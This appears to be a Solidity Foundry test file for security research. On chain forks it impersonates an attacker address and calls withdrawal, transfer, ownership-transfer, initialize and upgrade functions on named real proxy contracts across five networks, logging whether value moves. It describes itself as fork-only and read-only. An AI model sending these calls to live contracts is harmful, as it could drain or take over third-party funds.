// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/// @title Unverified-impl proxy tail — unprivileged extraction probe
/// @notice READ-ONLY research. Fork-only. No mainnet transactions.
/// For each target proxy: impersonate a FRESH EOA and call the money-path
/// selectors; record whether the call succeeds and whether the proxy's
/// token/native balance changes. Any success + value movement == E-U.
contract Probe is Test {
    address constant ATT = address(0x000000000000000000000000000000000000dEaD);
    address constant ATT2 = address(0x0000000000000000000000000000000000Beef01);

    // ---- canonical tokens ----
    address constant OP_WETH  = 0x4200000000000000000000000000000000000006;
    address constant OP_USDT  = 0x94b008aA00579c1307B0EF2c499aD98a8ce58e58;
    address constant OP_USDC  = 0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85;
    address constant POL_WPOL = 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
    address constant POL_WETH = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
    address constant ZK_USDC  = 0x1d17CBcF0D6D143135aE902365D2E5e2A16538D4;
    address constant SCR_WETH = 0x5300000000000000000000000000000000000004;
    address constant SCR_USDC = 0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4;

    function _rpc(string memory key, string memory fallback_) internal view returns (string memory) {
        string memory v = vm.envOr(key, fallback_);
        return bytes(v).length == 0 ? fallback_ : v;
    }
    function _bal(address token, address who) internal view returns (uint256) {
        (bool ok, bytes memory r) = token.staticcall(abi.encodeWithSelector(0x70a08231, who));
        if (!ok || r.length < 32) return 0;
        return abi.decode(r, (uint256));
    }
    function _callAs(address who, address target, bytes memory data)
        internal returns (bool ok, bytes memory ret)
    {
        vm.prank(who);
        (ok, ret) = target.call(data);
    }

    /// probe one token-extraction attempt; returns ok + balance delta
    function _probe(
        string memory label,
        address proxy,
        address token,
        string memory selName,
        bytes memory data
    ) internal {
        uint256 tb0 = token == address(0) ? 0 : _bal(token, proxy);
        uint256 nb0 = proxy.balance;
        (bool ok, bytes memory ret) = _callAs(ATT, proxy, data);
        uint256 tb1 = token == address(0) ? 0 : _bal(token, proxy);
        uint256 nb1 = proxy.balance;
        uint256 dt = tb0 > tb1 ? tb0 - tb1 : 0;
        uint256 dn = nb0 > nb1 ? nb0 - nb1 : 0;
        console2.log(string.concat("[", label, "] ", selName, "  startTok=", vm.toString(tb0)));
        console2.log("   startNative=", nb0, " ok=", ok);
        console2.log("   tokenDelta=", dt, " nativeDelta=", dn);
        if (ok && (dt > 0 || dn > 0)) {
            console2.log("   *** VALUE MOVED ***");
        }
        if (!ok && ret.length >= 4) {
            bytes4 e = bytes4(ret);
            console2.logBytes4(e);
            if (e == 0x08c379a0 && ret.length > 68) {
                console2.log(string(abi.decode(sliceBytes(ret, 4, ret.length - 4), (string))));
            }
        }
    }

    function sliceBytes(bytes memory b, uint256 start, uint256 len)
        internal pure returns (bytes memory out)
    {
        out = new bytes(len);
        for (uint256 i = 0; i < len; i++) out[i] = b[start + i];
    }

    // ------------------------------------------------------------------
    // Optimism
    // ------------------------------------------------------------------
    function test_OP() public {
        vm.createSelectFork(_rpc("OP_RPC_URL", "https://mainnet.optimism.io"));
        console2.log("OP block", block.number);

        // row22 exactly exaWETH ERC-4626 (asset WETH)
        {
            address p = 0xc4d4500326981eacD020e20A81b1c479c161c7EF;
            _probe("row22", p, OP_WETH, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(OP_WETH, p)));
            _probe("row22", p, OP_WETH, "redeem(shares,att,att)",
                abi.encodeWithSelector(0xba087652, _bal(p, ATT), ATT, ATT));
            _probe("row22", p, OP_WETH, "withdraw(assets,att,att)",
                abi.encodeWithSelector(0xb460af94, _bal(OP_WETH, p), ATT, ATT));
            _probe("row22", p, OP_WETH, "redeem(1e18,att,att)",
                abi.encodeWithSelector(0xba087652, uint256(1e18), ATT, ATT));
        }
        // row18 subaccount (owner 0xc428439f..)
        {
            address p = 0xA4B6D09c26113F90E7b0B42E76E6FA1959b354b5;
            _probe("row18", p, OP_WETH, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(OP_WETH, p)));
            _probe("row18", p, OP_WETH, "withdraw(WETH,bal,att)",
                abi.encodeWithSelector(0x69328dec, OP_WETH, _bal(OP_WETH, p), ATT));
            _probe("row18", p, OP_WETH, "withdrawFromSubaccount(bal,proxy)",
                abi.encodeWithSignature("withdrawFromSubaccount(uint256,address)", _bal(OP_WETH, p), p));
            _probe("row18", p, OP_WETH, "withdrawFromSubaccount(bal,att)",
                abi.encodeWithSignature("withdrawFromSubaccount(uint256,address)", _bal(OP_WETH, p), ATT));
            _probe("row18", p, OP_WETH, "withdrawFromSubaccount(address,uint256)",
                abi.encodeWithSignature("withdrawFromSubaccount(address,uint256)", OP_WETH, _bal(OP_WETH, p)));
            _probe("row18", p, address(0), "transferOwnership(att)",
                abi.encodeWithSelector(0xf2fde38b, ATT));
        }
        // row13 WOOFi CrosswapRouter v5 (WETH + USDT)
        {
            address p = 0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4;
            _probe("row13", p, OP_WETH, "withdraw(WETH,bal)",
                abi.encodeWithSelector(0xf3fef3a3, OP_WETH, _bal(OP_WETH, p)));
            _probe("row13", p, OP_USDT, "withdraw(USDT,bal)",
                abi.encodeWithSelector(0xf3fef3a3, OP_USDT, _bal(OP_USDT, p)));
            _probe("row13", p, OP_WETH, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(OP_WETH, p)));
            _probe("row13", p, address(0), "transferOwnership(att)",
                abi.encodeWithSelector(0xf2fde38b, ATT));
        }
        // row16
        {
            address p = 0x3cDbbC3eCa52a65998B021C67982Bc72B2deCef0;
            _probe("row16", p, OP_WETH, "withdraw(bal)",
                abi.encodeWithSelector(0x2e1a7d4d, _bal(OP_WETH, p)));
            _probe("row16", p, OP_WETH, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(OP_WETH, p)));
            _probe("row16", p, OP_WETH, "deposit(bal)",
                abi.encodeWithSelector(0xb6b55f25, _bal(OP_WETH, p)));
        }
        // row17 Wanchain asset lock (USDT+USDC)
        {
            address p = 0xC6Ae1Db6C66d909F7bFEeEb24F9adb8620bf9dbf;
            _probe("row17", p, OP_USDT, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(OP_USDT, p)));
            _probe("row17", p, OP_USDC, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(OP_USDC, p)));
            _probe("row17", p, address(0), "transferOwnership(att)",
                abi.encodeWithSelector(0xf2fde38b, ATT));
        }
        // row19 Compound-fork market (owner 0x2869b95d..)
        {
            address p = 0x6726CA16b1Ba702f58D835cf199672CA04E727eC;
            _probe("row19", p, OP_WETH, "redeem(bal)",
                abi.encodeWithSelector(0xdb006a75, _bal(p, ATT) == 0 ? uint256(1e18) : _bal(p, ATT)));
            _probe("row19", p, OP_WETH, "mint(1e18)",
                abi.encodeWithSelector(0xa0712d68, uint256(1e18)));
            _probe("row19", p, OP_WETH, "withdraw(WETH,bal,att)",
                abi.encodeWithSelector(0x69328dec, OP_WETH, _bal(OP_WETH, p), ATT));
            _probe("row19", p, OP_WETH, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(OP_WETH, p)));
            _probe("row19", p, address(0), "transferOwnership(att)",
                abi.encodeWithSelector(0xf2fde38b, ATT));
        }
    }

    // ------------------------------------------------------------------
    // Polygon
    // ------------------------------------------------------------------
    function test_Polygon() public {
        vm.createSelectFork(_rpc("POLYGON_RPC_URL", "https://polygon.drpc.org"));
        console2.log("Polygon block", block.number);

        // row14 WOOFi CrosswapRouter v5 (WPOL)
        {
            address p = 0x5520385bFcf07Ec87C4c53A7d8d65595Dff69FA4;
            _probe("row14", p, POL_WPOL, "withdraw(WPOL,bal)",
                abi.encodeWithSelector(0xf3fef3a3, POL_WPOL, _bal(POL_WPOL, p)));
            _probe("row14", p, POL_WPOL, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(POL_WPOL, p)));
            _probe("row14", p, address(0), "transferOwnership(att)",
                abi.encodeWithSelector(0xf2fde38b, ATT));
        }
        // row21 UUPS (owner 0x58c5927b..)
        {
            address p = 0xB07FfFf3c7DE073c9dA55dcD899fcd4AD8C3050D;
            _probe("row21", p, POL_WETH, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(POL_WETH, p)));
            _probe("row21", p, address(0), "upgradeToAndCall(att,0x)",
                abi.encodeWithSelector(0x4f1ef286, ATT, bytes("")));
            _probe("row21", p, address(0), "initialize(att)",
                abi.encodeWithSelector(0xc4d66de8, ATT));
            _probe("row21", p, address(0), "transferOwnership(att)",
                abi.encodeWithSelector(0xf2fde38b, ATT));
        }
    }

    // ------------------------------------------------------------------
    // zkSync
    // ------------------------------------------------------------------
    function test_ZkSync() public {
        vm.createSelectFork(_rpc("ZKSYNC_RPC_URL", "https://mainnet.era.zksync.io"));
        console2.log("zkSync block", block.number);
        // row20 Fulcrom Vault
        address p = 0x7d5b0215EF203D0660BC37d5D09d964fd6b55a1E;
        _probe("row20", p, ZK_USDC, "transfer(att,bal)",
            abi.encodeWithSelector(0xa9059cbb, ATT, _bal(ZK_USDC, p)));
        _probe("row20", p, address(0), "transferOwnership(att)",
            abi.encodeWithSelector(0xf2fde38b, ATT));
        _probe("row20", p, address(0), "upgradeToAndCall(att,0x)",
            abi.encodeWithSelector(0x4f1ef286, ATT, bytes("")));
    }

    // ------------------------------------------------------------------
    // BSC
    // ------------------------------------------------------------------
    function test_BSC() public {
        vm.createSelectFork(_rpc("BSC_RPC_URL", "https://bsc-dataseed.binance.org"));
        console2.log("BSC block", block.number);
        address p = 0x4CA08cD98De12a1Df316da8f93BD0b40146e1589;
        _probe("row15", p, address(0), "withdraw(1e18)",
            abi.encodeWithSelector(0x2e1a7d4d, uint256(1e18)));
        _probe("row15", p, address(0), "initialize(att)",
            abi.encodeWithSelector(0xc4d66de8, ATT));
        _probe("row15", p, address(0), "upgradeToAndCall(att,0x)",
            abi.encodeWithSelector(0x4f1ef286, ATT, bytes("")));
    }

    // ------------------------------------------------------------------
    // Scroll
    // ------------------------------------------------------------------
    function test_Scroll() public {
        vm.createSelectFork(_rpc("SCROLL_RPC_URL", "https://rpc.scroll.io"));
        console2.log("Scroll block", block.number);
        // scr1
        {
            address p = 0x25aB3Efd52e6470681CE037cD546Dc60726948D3;
            _probe("scr1", p, SCR_USDC, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(SCR_USDC, p)));
            _probe("scr1", p, address(0), "upgradeToAndCall(att,0x)",
                abi.encodeWithSelector(0x4f1ef286, ATT, bytes("")));
            _probe("scr1", p, address(0), "upgradeTo(att)",
                abi.encodeWithSelector(0x3659cfe6, ATT));
            _probe("scr1", p, address(0), "transferOwnership(att)",
                abi.encodeWithSelector(0xf2fde38b, ATT));
        }
        // scr2
        {
            address p = 0x740a7C5Ef2F71Edb446F016a3D52a916f8fb2cE7;
            _probe("scr2", p, SCR_WETH, "withdraw(bal)",
                abi.encodeWithSelector(0x2e1a7d4d, _bal(SCR_WETH, p)));
            _probe("scr2", p, SCR_WETH, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(SCR_WETH, p)));
            _probe("scr2", p, address(0), "upgradeToAndCall(att,0x)",
                abi.encodeWithSelector(0x4f1ef286, ATT, bytes("")));
        }
        // scr3
        {
            address p = 0x7BE980E327692Cf11E793A0d141D534779AF8Ef4;
            _probe("scr3", p, SCR_USDC, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(SCR_USDC, p)));
            _probe("scr3", p, address(0), "initialize(att)",
                abi.encodeWithSelector(0xc4d66de8, ATT));
            _probe("scr3", p, address(0), "upgradeToAndCall(att,0x)",
                abi.encodeWithSelector(0x4f1ef286, ATT, bytes("")));
        }
        // scr4
        {
            address p = 0x7ba30C4c1089Fa8cC545F6d058cAd3c4172742F2;
            _probe("scr4", p, SCR_WETH, "transfer(att,bal)",
                abi.encodeWithSelector(0xa9059cbb, ATT, _bal(SCR_WETH, p)));
            _probe("scr4", p, SCR_WETH, "deposit(bal)",
                abi.encodeWithSelector(0xb6b55f25, _bal(SCR_WETH, p)));
            _probe("scr4", p, address(0), "transferOwnership(att)",
                abi.encodeWithSelector(0xf2fde38b, ATT));
        }
    }
}
